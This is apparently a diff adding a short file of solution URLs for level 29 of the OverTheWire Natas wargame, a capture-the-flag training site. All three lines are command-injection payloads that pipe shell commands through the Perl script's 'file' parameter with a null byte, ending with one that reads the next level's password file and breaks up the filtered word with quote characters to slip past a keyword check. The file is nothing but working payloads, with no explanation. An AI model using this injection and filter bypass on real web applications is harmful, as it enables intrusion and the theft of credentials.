@@ -1,0 +1,5 @@
+http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
+
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+index.pl%00
+
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%22%22tas_webpass/nat%22%22as30%00
